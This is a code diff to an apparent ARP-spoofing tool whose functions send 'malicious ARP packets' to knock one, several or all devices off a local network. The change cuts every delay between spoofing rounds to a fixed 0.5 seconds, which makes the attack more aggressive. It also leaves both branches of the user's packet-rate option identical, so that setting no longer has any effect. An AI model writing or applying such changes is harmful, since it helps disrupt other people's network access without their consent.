@@ -433,9 +433,9 @@ def kickoneoff():
             # broadcast malicious ARP packets
             spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, oneTargetIP, oneTargetMAC)
             if options.packets is not None:
-                time.sleep(60/float(options.packets))
+                time.sleep(0.5)
             else:
-                time.sleep(10)
+                time.sleep(0.5)
     except KeyboardInterrupt:
         # re-arp target on KeyboardInterrupt exception
         print("\n{}Re-arping{} target...{}".format(RED, GREEN, END))
@@ -523,9 +523,9 @@ def kicksomeoff():
                     if host[0] == ip:
                         spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
             if options.packets is not None:
-                time.sleep(60/float(options.packets))
+                time.sleep(0.5)
             else:
-                time.sleep(10)
+                time.sleep(0.5)
     except KeyboardInterrupt:
         # re-arp targets on KeyboardInterrupt exception
         print("\n{}Re-arping{} targets...{}".format(RED, GREEN, END))
@@ -596,9 +596,9 @@ def kickalloff():
                 reScan = 0
                 scanNetwork()
             if options.packets is not None:
-                time.sleep(60/float(options.packets))
+                time.sleep(0.5)
             else:
-                time.sleep(10)
+                time.sleep(0.5)
     except KeyboardInterrupt:
         print("\n{}Re-arping{} targets...{}".format(RED, GREEN, END))
         reArp = 1
